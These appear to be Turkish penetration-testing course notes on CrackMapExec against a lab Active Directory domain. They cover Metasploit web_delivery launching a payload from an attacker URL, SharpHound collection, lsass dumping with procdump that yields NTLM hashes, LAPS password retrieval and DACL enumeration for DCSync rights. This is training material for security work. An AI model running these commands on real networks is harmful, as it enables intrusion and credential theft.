Metasploit'te web delivery handler yapÄ±landÄ±rÄ±ldÄ±ktan sonra web_delivery modÃ¼lÃ¼nÃ¼ kullanabiliriz. `URL` ve `PAYLOAD` olmak Ã¼zere iki seÃ§eneÄŸi destekler. URL seÃ§eneÄŸini Metasploit tarafÄ±ndan saÄŸlanan URL ile ayarlamamÄ±z gerekir ve PAYLOAD seÃ§eneÄŸi seÃ§tiÄŸimiz payload mimarisine karÅŸÄ±lÄ±k gelir. EÄŸer `x64` kullanÄ±yorsak, `x64` varsayÄ±lan deÄŸer olduÄŸu iÃ§in bu seÃ§eneÄŸi atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. EÄŸer `32 bit` payload kullanÄ±yorsak `PAYLOAD=32` seÃ§eneÄŸini ayarlamamÄ±z gerekir. Åimdi bunu Ã§alÄ±ÅŸÄ±rken gÃ¶relim:


### CrackMapExec web_delivery Module

```
crackmapexec smb -M web_delivery --options

[*] web_delivery module options:
	 URL URL for the download cradle
	 PAYLOAD Payload architecture (choices: 64 or 32) Default: 64

```

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M web_delivery -o URL=http://10.10.14.33:8443/2S1jAHS

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
WEB_DELI... 10.129.204.133 445 MS01 [+] Executed webdelivery launcher
```

Metasploit'te yeni bir oturum gÃ¶rmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

BaÅŸka bir C2 Framework kullanmak istediÄŸimizde, **Command Execution** bÃ¶lÃ¼mÃ¼nde bahsedilen (SMB, WinRM, SSH) yÃ¶ntemleri kullanarak aynÄ± sonucu elde edebiliriz. Ã–rneÄŸin, bir **PowerShell** payload'u oluÅŸturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip Ã§alÄ±ÅŸtÄ±rmak iÃ§in **-X** seÃ§eneÄŸiyle bir PowerShell komutu Ã§alÄ±ÅŸtÄ±rabiliriz. AyrÄ±ca, iÅŸlemi arka planda yÃ¼rÃ¼tmek iÃ§in **`--no-output`** seÃ§eneÄŸini seÃ§memiz gerekecektir.

Ã–rnek olarak Metasploit'i kullanalÄ±m ve modÃ¼lÃ¼ kullanmak yerine web_delivery payload'unda saÄŸlanan PowerShell script'ini kopyalamayÄ± deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bÃ¶lÃ¼m, CrackMapExec'i C2 Frameworks gibi diÄŸer bilgisayar korsanlÄ±ÄŸÄ± araÃ§larÄ±yla nasÄ±l kullanabileceÄŸimizi araÅŸtÄ±rÄ±yor. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in BloodHound ile nasÄ±l entegre edileceÄŸi incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldÄ±rganlar hem de savunmacÄ±lar tarafÄ±ndan alan gÃ¼venliÄŸini analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir araÃ§tÄ±r. AraÃ§, domain'den toplanan bÃ¼yÃ¼k miktarda veriyi alÄ±r. Ä°liÅŸkiyi gÃ¶rsel olarak temsil etmek ve geleneksel numaralandÄ±rma ile tespit edilmesi zor veya imkansÄ±z olan domain saldÄ±rÄ± yollarÄ±nÄ± belirlemek iÃ§in grafik teorisini kullanÄ±r. Bu bÃ¶lÃ¼mde Bloodhound'a aÅŸina olduÄŸunuzu varsayÄ±yoruz. 


### **BloodHound**'da **Owned** olarak iÅŸaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geÃ§irilmiÅŸ (owned) olarak iÅŸaretleyebiliriz. Bunu yapmak iÃ§in node'a saÄŸ tÄ±klayÄ±p **`Mark X as Owned`** seÃ§eneÄŸine tÄ±klamamÄ±z yeterlidir. Bu, ele geÃ§irdiÄŸimiz kullanÄ±cÄ±larÄ± ve bilgisayarlarÄ± takip etmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r, Ã¶zellikle bÃ¼yÃ¼k bir organizasyonla Ã§alÄ±ÅŸÄ±rken. AyrÄ±ca, **`Shortest Path from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan En KÄ±sa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan Domain Adminlerine En KÄ±sa Yollar) gibi bir BloodHound cypher sorgusu gerÃ§ekleÅŸtirmek istediÄŸimizde de kullanÄ±ÅŸlÄ±dÄ±r.

CrackMapExec'i, ele geÃ§irdiÄŸimiz herhangi bir user veya computer'Ä± BloodHound veritabanÄ±nda `owned` olarak iÅŸaretleyecek ÅŸekilde yapÄ±landÄ±rabiliriz. Bunu yapmak iÃ§in, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± aÅŸaÄŸÄ±daki seÃ§eneklerle deÄŸiÅŸtirmemiz gerekir:

* Bloodhound yapÄ±landÄ±rma seÃ§eneÄŸi `bh_enabled`'Ä± `True` olarak ayarlayÄ±n.
* `bh_uri`'yi Bloodhound veritabanÄ± `IP` adresimize ayarlayÄ±n.
* `bh_port`'u veritabanÄ± `portuna` ayarlayÄ±n
* Kimlik bilgilerini bloodhound veritabanÄ±yla eÅŸleÅŸecek ÅŸekilde ayarlayÄ±n: kullanÄ±cÄ± adÄ± `neo4j` ve ÅŸifre `asdasd123` (VeritabanÄ±nÄ±za karÅŸÄ±lÄ±k geleni kullandÄ±ÄŸÄ±nÄ±zdan emin olun).

YapÄ±landÄ±rma aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:


### Configuring BloodHound Database

```
cat ~/.cme/cme.conf
[CME]
workspace = default
last_used_db = smb
pwn3d_label = Pwn3d!
audit_mode =
[BloodHound]
bh_enabled = True
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = neo4j
bh_pass = asdasd123
<SNIP>
```

Not: BaÄŸlandÄ±ÄŸÄ±nÄ±z BloodHound veritabanÄ±na karÅŸÄ±lÄ±k gelen kullanÄ±cÄ± adÄ± ve parolayÄ± kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

### Bloodhound Verilerinin ToplanmasÄ±

BloodHound verilerini toplamak iÃ§in CrackMapExec kullanarak SharpHound'u Ã§alÄ±ÅŸtÄ±racak ve ardÄ±ndan dosyayÄ± saldÄ±rÄ± hostumuza aktaracaÄŸÄ±z.

### BloodHound verilerinin toplanmasÄ±

```
wget
https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -q
```

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 --put-file
SharpHound.exe SharpHound.exe
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!) SMB 10.129.203.121 445 DC01 [*] Copy
SharpHound.exe to SharpHound.exe SMB 10.129.203.121 445 DC01 [+] Created file
SharpHound.exe on \\C$\SharpHound.exe
```

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -x "C:\SharpHound.exe -c All && dir c:\*_BloodHound.zip"
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
SMB 10.129.203.121 445 DC01 [+] Executed command
SMB 10.129.203.121 445 DC01 Volume in drive C has no label.
SMB 10.129.203.121 445 DC01 Volume Serial Number is B8B3-0D72
SMB 10.129.203.121 445 DC01
SMB 10.129.203.121 445 DC01 Directory of c:\
SMB 10.129.203.121 445 DC01
SMB 10.129.203.121 445 DC01 11/09/2022 09:54 AM 14,287 20221109095424_BloodHound.zip
SMB 10.129.203.121 445 DC01 1 File(s) 14,287 bytes
SMB 10.129.203.121 445 DC01 0 Dir(s) 8,828,305,408 bytes free
```

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 --get-file
20221109095424_BloodHound.zip bloodhound.zip
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
SMB 10.129.203.121 445 DC01 [*] Copy 20221109095424_BloodHound.zip to bloodhound.zip
SMB 10.129.203.121 445 DC01 [+] File 20221109095424_BloodHound.zip was transferred to bloodhound.zip
```

Åimdi BloodHound'u aÃ§mamÄ±z ve verileri iÃ§e aktarmamÄ±z gerekiyor.


### BloodHound'da KullanÄ±cÄ±larÄ± Owned Olarak Ayarlama

Veriler iÃ§e aktarÄ±ldÄ±ktan sonra, `robert` kullanÄ±cÄ±sÄ± ile baÄŸlanmaya Ã§alÄ±ÅŸÄ±rsak, kullanÄ±cÄ±yÄ± BloodHound veritabanÄ±nda owned olunan olarak ayarlayacaktÄ±r.

### KullanÄ±cÄ± BloodHound'da Owned Olarak Eklendi

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 Node [email protected] successfully set as owned in BloodHound
```

Birden fazla kullanÄ±cÄ±sÄ± olan bir makineyi tehlikeye atarsak da aynÄ± ÅŸey olacaktÄ±r. Bulunan tÃ¼m yeni kullanÄ±cÄ±larÄ± owned olarak ayarlayacaktÄ±r.

### Procdump ModÃ¼lÃ¼ ile KullanÄ±cÄ±larÄ± Owned Olarak Ekleme

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M procdump

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
SMB 10.129.203.121 445 DC01 Node [email protected]
successfully set as owned in BloodHound
PROCDUMP 10.129.203.121 445 DC01 [*] Copy
/tmp/shared/procdump.exe to C:\Windows\Temp\
PROCDUMP 10.129.203.121 445 DC01 [+] Created file
procdump.exe on the \\C$\Windows\Temp\
PROCDUMP 10.129.203.121 445 DC01 [*] Getting lsass PID
tasklist /v /fo csv | findstr /i "lsass"
PROCDUMP 10.129.203.121 445 DC01 [*] Executing command
C:\Windows\Temp\procdump.exe -accepteula -ma 640
C:\Windows\Temp\%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp
PROCDUMP 10.129.203.121 445 DC01 [+] Process lsass.exe
was successfully dumped
PROCDUMP 10.129.203.121 445 DC01 [*] Copy DC01-AMD64-
INLANEFREIGHT.dmp to host
PROCDUMP 10.129.203.121 445 DC01 [+] Dumpfile of
lsass.exe was transferred to /tmp/shared/DC01-AMD64-INLANEFREIGHT.dmp
PROCDUMP 10.129.203.121 445 DC01 [+] Deleted procdump
file on the C$ share
PROCDUMP 10.129.203.121 445 DC01 [+] Deleted lsass.dmp
file on the C$ share
PROCDUMP 10.129.203.121 445 DC01
127.0.0.1\julio:Password1
PROCDUMP 10.129.203.121 445 DC01
INLANEFREIGHT\svc_mssql:842bfb5892fc6cbe2af323e3199f0f18
PROCDUMP 10.129.203.121 445 DC01
INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
PROCDUMP 10.129.203.121 445 DC01
127.0.0.1\julio:Password1
PROCDUMP 10.129.203.121 445 DC01
INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
PROCDUMP 10.129.203.121 445 DC01
127.0.0.1\julio:Password1
PROCDUMP 10.129.203.121 445 DC01
127.0.0.1\julio:Password1
PROCDUMP 10.129.203.121 445 DC01
INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
PROCDUMP 10.129.203.121 445 DC01
\julio:500aad7ceb637a4255d101d50045310b31729ddb
PROCDUMP 10.129.203.121 445 DC01
127.0.0.1\julio:Password1
PROCDUMP 10.129.203.121 445 DC01
INLANEFREIGHT\david:c39f2beb3d2ec06a62cb887fb391dee0
PROCDUMP 10.129.203.121 445 DC01
INLANEFREIGHT\svc_workstations:7247e8d4387e76996ff3f18a34316fdd
PROCDUMP 10.129.203.121 445 DC01 Node [email protected]
successfully set as owned in BloodHound
PROCDUMP 10.129.203.121 445 DC01 Node [email protected]
successfully set as owned in BloodHound
PROCDUMP 10.129.203.121 445 DC01 Node [email protected]
successfully set as owned in BloodHound
```


Not: TÃ¼m CrackMapExec seÃ§enekleri BloodHound veritabanÄ± ile senkronize olmayacaktÄ±r. Ã–rneÄŸin, `--ntds` veya `--lsa` seÃ§eneklerini denersek, kullanÄ±cÄ±larÄ± veritabanÄ±nda sahip olunan olarak iÅŸaretlemez, ancak `procdump` veya `lsassy` gibi modÃ¼ller kullanÄ±cÄ±larÄ± sahip olunan olarak iÅŸaretler.


### BloodHound'da BilgisayarlarÄ± Owned Olarak Ayarlama

YazÄ±m sÄ±rasÄ±nda, BloodHound entegrasyonu yalnÄ±zca user'larÄ± Owned olarak iÅŸaretlemektedir. Bir `computer` owned olarak iÅŸaretlemek istiyorsak, `bh_owned` modÃ¼lÃ¼nÃ¼ ve `neo4j` veritabanÄ±mÄ±zÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifresini kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, diÄŸer varsayÄ±lan deÄŸerler neo4j veritabanÄ±mÄ±zla eÅŸleÅŸtiÄŸi iÃ§in yalnÄ±zca `PASS` seÃ§eneÄŸini ekleyeceÄŸiz.

```
crackmapexec smb -M bh_owned --options

[*] bh_owned module options:
 URI URI for Neo4j database (default: 127.0.0.1)
 PORT Listening port for Neo4j database (default:
7687)
 USER Username for Neo4j database (default: 'neo4j')
 PASS Password for Neo4j database (default: 'neo4j')
```

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M bh_owned -o
PASS=asdasd123

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)

SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
BH_OWNED 10.129.203.121 445 DC01 [+] Node
DC01.INLANEFREIGHT.HTB successfully set as owned in BloodHound
```

BloodHound'un CrackMapExec'e entegrasyonu, bÃ¼yÃ¼k aÄŸlarla uÄŸraÅŸÄ±rken birÃ§ok seÃ§enek sunar ve mÃ¼ÅŸterilerimizle paylaÅŸmak istememiz durumunda veritabanÄ±nÄ± gÃ¼ncellemenin hÄ±zlÄ± bir yoludur. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec'te mevcut olan bazÄ± popÃ¼ler modÃ¼llerle Ã§alÄ±ÅŸacaÄŸÄ±z.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici ÅŸeylerden biri, modÃ¼ler olmasÄ± ve herkesin modÃ¼ller oluÅŸturmasÄ±na ve bunlarÄ± araca katkÄ±da bulunmasÄ±na izin vermesidir. CrackMapExec, exploit ve exploit sonrasÄ± gÃ¶revleri kolaylaÅŸtÄ±rmak iÃ§in iÅŸlemler gerÃ§ekleÅŸtirmemizi saÄŸlayan 50'den fazla modÃ¼le sahiptir. Bu bÃ¶lÃ¼mde LDAP ve SMB protokolleri iÃ§in bu modÃ¼llerden bazÄ±larÄ± incelenecektir.


### LDAP Protocol Modules

LDAP protokolÃ¼ yaygÄ±n olarak Domain Controller'lar ile etkileÅŸime geÃ§memizi ve onlardan bilgi almamÄ±zÄ± saÄŸlar. Active Directory'den ilginÃ§ bilgiler Ã§Ä±karmamÄ±zÄ± saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.


### **LDAP Module - get-network**

`get-network` modÃ¼lÃ¼ [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'Ä±  temel alÄ±r. VarsayÄ±lan olarak, Active Directory'deki herhangi bir kullanÄ±cÄ±, `zone transferine` benzer ÅŸekilde Domain veya Forest DNS bÃ¶lgelerindeki tÃ¼m DNS kayÄ±tlarÄ±nÄ± numaralandÄ±rabilir. Bu araÃ§, internal aÄŸlarÄ±n yeniden yapÄ±landÄ±rÄ±lmasÄ± amacÄ±yla bÃ¶lgedeki tÃ¼m DNS kayÄ±tlarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± saÄŸlar.

ModÃ¼lÃ¼ kullanmanÄ±n Ã¼Ã§ (3) yolu vardÄ±r:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adlarÄ±).

VarsayÄ±lan olarak, herhangi bir seÃ§enek belirtmezsek, modÃ¼l yalnÄ±zca IP adresini alacaktÄ±r. `ALL=true` seÃ§eneÄŸini seÃ§ersek, hem IP hem de domain adlarÄ±nÄ± alÄ±r ve `ONLY_HOSTS=true` olarak belirtirsek, yalnÄ±zca FQDN'yi alÄ±rÄ±z.


### DNS Sunucusundan (Record) KayÄ±tlarÄ± Alma

```
crackmapexec ldap dc01.inlanefreight.htb -u julio -p Password1 -M getnetwork --options

[*] get-network module options:
 ALL Get DNS and IP (default: false)
 ONLY_HOSTS Get DNS only (no ip) (default: false)
```

```
crackmapexec ldap dc01.inlanefreight.htb -u julio -p Password1 -M getnetwork -o ALL=true

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
GET-NETW... dc01.inlanefreight.htb 389 DC01 [*] Querying
zone for records
GET-NETW... dc01.inlanefreight.htb 389 DC01 [*] Using
System DNS to resolve unknown entries. Make sure resolving your target
domain works here or specify an IP as target host to use that server for
queries
GET-NETW... dc01.inlanefreight.htb 389 DC01 Found 4 records
GET-NETW... dc01.inlanefreight.htb 389 DC01 [+] Dumped 4
records to /home/plaintext/.cme/logs/inlanefreight.htb_network_2022-12-
13_065607.log

```

```
cat /home/plaintext/.cme/logs/inlanefreight.htb_network_2022-11-
10_101113.log
dc01.inlanefreight.htb 10.129.203.121
test.inlanefreight.htb 172.16.1.39
database01.inlanefreight.htb 172.16.1.29
```


Not: Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± zamanda, modÃ¼l **`adidnsdump`** aracÄ±yla bazÄ± farklÄ±lÄ±klar gÃ¶stermektedir. SonuÃ§lar, hesaplar arasÄ±nda farklÄ±lÄ±k gÃ¶sterebilir.


### LDAP Module - laps

Bir baÅŸka harika modÃ¼l de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e baÄŸlÄ± bilgisayarlarda local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL'ler tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca belirli kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya `parola sÄ±fÄ±rlama` talebinde bulunabilir. Laps modÃ¼lÃ¼ ile bir hesabÄ±n okuma eriÅŸimine sahip olduÄŸu tÃ¼m bilgisayarlarÄ± alabiliriz. Bir bilgisayarÄ± belirtmek iÃ§in `COMPUTER` seÃ§eneÄŸini de kullanabilir veya benzer ada sahip birkaÃ§ bilgisayarÄ± almak iÃ§in bir wildcard karakterle birlikte kullanabiliriz.


### LAPS ModÃ¼lÃ¼ ParolalarÄ±n AlÄ±nmasÄ±

```
crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! -M laps --options

[*] laps module options:
 COMPUTER Computer name or wildcard ex: WIN-S10, WIN-* etc.
Default: *

```

```
crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! -M
laps

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows 
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LAPS dc01.inlanefreight.htb 389 DC01 [*] Getting LAPS Passwords
LAPS dc01.inlanefreight.htb 389 DC01 Computer: MS01$
Password: 7*vp5Nc8Ph7uR&

```


Not: KullanÄ±lan parola bir Ã¶rnektir. Hedef hostta Ã§alÄ±ÅŸmayacaktÄ±r

### LDAP ModÃ¼lÃ¼ - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'Ã¼ ile temsil edilen ve varsayÄ±lan olarak bir **user**'Ä±n bir **domain** iÃ§inde oluÅŸturabileceÄŸi **computer account** sayÄ±sÄ±nÄ± belirten bir **domain level attribute**'tÃ¼r.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazÄ± **attack** senaryolarÄ±nda **domain** iÃ§inde bir **machine** oluÅŸturmak gerekebilir, bu yÃ¼zden **account machine quota attribute**'Ã¼nÃ¼ **enumerate** etmek Ã¶nemlidir.


### Machine Quota Module

```
crackmapexec ldap dc01.inlanefreight.htb -u robert -p 'Inlanefreight01!' -
M maq

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
MAQ dc01.inlanefreight.htb 389 DC01 [*] Getting the MachineAccountQuota
MAQ dc01.inlanefreight.htb 389 DC01
MachineAccountQuota: 6

```


### LDAP Module - daclread

Bir baÅŸka harika modÃ¼l ise bir veya birden fazla object'in `DACL`'lerini okumamÄ±zÄ± ve dÄ±ÅŸa aktarmamÄ±zÄ± saÄŸlayan `daclread`'dir. Bu modÃ¼l Active Directory eriÅŸimini numaralandÄ±rmamÄ±zÄ± saÄŸlayacaktÄ±r. AÅŸaÄŸÄ±daki seÃ§eneklere sahiptir:

### daclread Module Options

```
crackmapexec ldap -M daclread --options

[*] daclread module options:
 
	 Be carefull, this module cannot read the DACLS recursively. For
example, if an object has particular rights because it belongs to a group,
the module will not be able to see it directly, you have to check the
group rights manually.
	 TARGET The objects that we want to read or backup the
DACLs, sepcified by its SamAccountName
	 TARGET_DN The object that we want to read or backup the
DACL, specified by its DN (usefull to target the domain itself)
	 PRINCIPAL The trustee that we want to filter on
	 ACTION The action to realise on the DACL (read, backup)
	 ACE_TYPE The type of ACE to read (Allowed or Denied)
	 RIGHTS An interesting right to filter on ('FullControl',
'ResetPassword', 'WriteMembers', 'DCSync')
	 RIGHTS_GUID A right GUID that specify a particular rights to
filter on
```

Diyelim ki **`grace`** hesabÄ±nÄ±n tÃ¼m **ACE**'lerini okumak istiyoruz. Bunun iÃ§in **`TARGET`** seÃ§eneÄŸini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace KullanÄ±cÄ±sÄ±nÄ±n DACL'sini Oku

```
crackmapexec ldap dc01.inlanefreight.htb -u '' -p '' -M daclread -o
TARGET=grace ACTION=read

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+] inlanefreight.htb\:
DACLREAD dc01.inlanefreight.htb 389 DC01 Be carefull,
this module cannot read the DACLS recursively.
DACLREAD dc01.inlanefreight.htb 389 DC01 Target
principal found in LDAP (CN=grace,CN=Users,DC=inlanefreight,DC=htb)
[*] ACE[1] info
[*] ACE Type : ACCESS_ALLOWED_OBJECT_ACE
[*] ACE flags : None
[*] Access mask : ReadProperty
[*] Flags : ACE_OBJECT_TYPE_PRESENT
[*] Object type (GUID) : User-Account-Restrictions (4c164200-
20c0-11d0-a768-00aa006e0529)
[*] Trustee (SID) : RAS and IAS Servers (S-1-5-21-
3325992272-2815718403-617452758-553)
[*] ACE[2] info
[*] ACE Type : ACCESS_ALLOWED_OBJECT_ACE
[*] ACE flags : None
[*] Access mask : ReadProperty
[*] Flags : ACE_OBJECT_TYPE_PRESENT
[*] Object type (GUID) : User-Logon (5f202010-79a5-11d0-9020-
00c04fc2d4cf)
[*] Trustee (SID) : RAS and IAS Servers (S-1-5-21-
3325992272-2815718403-617452758-553)
<SNIP>
```


AyrÄ±ca belirli haklarÄ± da arayabiliriz, Ã¶rneÄŸin hangi **principal**'larÄ±n **DCSync** haklarÄ±na sahip olduÄŸunu. Bunun iÃ§in **`TARGET_DN`** seÃ§eneÄŸini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seÃ§eneÄŸini seÃ§memiz ve aramak istediÄŸimiz haklarÄ± **`RIGHTS`** seÃ§eneÄŸiyle belirlememiz gerekir.

### DCSync Rights'a Sahip KullanÄ±cÄ±larÄ± Arama

```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M
daclread -o TARGET_DN="DC=inlanefreight,DC=htb" ACTION=read RIGHTS=DCSync

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
DACLREAD dc01.inlanefreight.htb 389 DC01 Be carefull,
this module cannot read the DACLS recursively.
DACLREAD dc01.inlanefreight.htb 389 DC01 Target
principal found in LDAP (DC=inlanefreight,DC=htb)
[*] ACE[3] info
[*] ACE Type : ACCESS_ALLOWED_OBJECT_ACE
[*] ACE flags : None
[*] Access mask : ControlAccess
[*] Flags : ACE_OBJECT_TYPE_PRESENT
[*] Object type (GUID) : DS-Replication-Get-Changes-All
(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
[*] Trustee (SID) : Domain Controllers (S-1-5-21-
3325992272-2815718403-617452758-516)
[*] ACE[4] info
[*] ACE Type : ACCESS_ALLOWED_OBJECT_ACE
[*] ACE flags : None
[*] Access mask : ControlAccess
[*] Flags : ACE_OBJECT_TYPE_PRESENT
[*] Object type (GUID) : DS-Replication-Get-Changes-All
(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
[*] Trustee (SID) : robert (S-1-5-21-3325992272-2815718403-
617452758-2607)
[*] ACE[17] info
[*] ACE Type : ACCESS_ALLOWED_OBJECT_ACE
[*] ACE flags : None
[*] Access mask : ControlAccess
[*] Flags : ACE_OBJECT_TYPE_PRESENT
[*] Object type (GUID) : DS-Replication-Get-Changes-All
(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
[*] Trustee (SID) : Administrators (S-1-5-32-544)
```



Ã‡Ä±ktÄ±da gÃ¶sterildiÄŸi gibi, `ACE[4]` `robert` kullanÄ±cÄ±sÄ±nÄ±n hedef domain'de `DCSync` haklarÄ±na sahip olduÄŸunu gÃ¶sterir.

LDAP'ta birkaÃ§ modÃ¼l daha kullanabiliriz. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.

### LDAP Protocol Modules

```
crackmapexec ldap -L

[*] MAQ Retrieves the MachineAccountQuota domainlevel attribute
[*] adcs Find PKI Enrollment Services in Active
Directory and Certificate Templates Names
[*] daclread Read and backup the Discretionary Access
Control List of objects. Based on the work of @_nwodtuhs and @BlWasp_. Be
carefull, this module cannot read the DACLS recursively, more explains in
the options.
[*] get-desc-users Get description of the users. May contained password
[*] get-network
[*] laps Retrieves the LAPS passwords
[*] ldap-checker Checks whether LDAP signing and binding are required and / or enforced
[*] ldap-signing Check whether LDAP signing is required
[*] subnets Retrieves the different Sites and Subnets of an Active Directory
[*] user-desc Get user descriptions stored in Active Directory
[*] whoami Get details of provided user
```


### SMB Protocol Modules

SMB protokolÃ¼nde daha fazla modÃ¼l mevcuttur. CrackMapExec modÃ¼lÃ¼nde yaptÄ±ÄŸÄ±mÄ±z ÅŸeylerin Ã§oÄŸu SMB protokolÃ¼nÃ¼ kullanÄ±r. Ä°lginÃ§ bilgiler elde etmemizi saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.

Not: SMB kullanan modÃ¼llerin Ã§oÄŸunun Ã§alÄ±ÅŸmasÄ± iÃ§in admin haklarÄ±na ( `Pwned!` ) ihtiyaÃ§ vardÄ±r.


### SMB ModÃ¼lleri - get_netconnections ve ioxidresolver

Bir aÄŸ pentesti Ã¼zerinde Ã§alÄ±ÅŸÄ±rken, sÃ¼rekli olarak daha fazla kaynaÄŸa veya aÄŸa eriÅŸim elde etmeye Ã§alÄ±ÅŸÄ±rÄ±z. CrackMapExec, daha Ã¶nce tehlikeye attÄ±ÄŸÄ±mÄ±z bir makineyi numaralandÄ±rmamÄ±za ve birden fazla aÄŸ yapÄ±landÄ±rmasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± belirlememize olanak tanÄ±yan bazÄ± modÃ¼llere sahiptir. `get_netconnections` ve `ioxidresolver` modÃ¼llerini kullanalÄ±m ve farklarÄ±nÄ± gÃ¶relim.

